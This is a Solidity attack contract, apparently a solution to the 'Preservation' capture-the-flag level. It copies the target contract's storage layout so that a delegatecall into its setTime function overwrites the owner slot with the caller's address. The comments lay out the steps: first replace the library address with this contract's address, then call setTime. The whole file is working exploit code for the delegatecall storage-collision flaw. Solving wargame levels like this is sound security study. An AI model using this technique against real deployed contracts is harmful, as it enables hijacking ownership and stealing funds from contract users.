// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
    // we need to change the address of 'timeZone1Library' to the address of this contract, so that our 'setTime'
    // function would update the 'owner'.

    // we need to keep the ordering of the state variables same as that in the 'preservation' contract to have the
    // same functions at the same slot number.
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
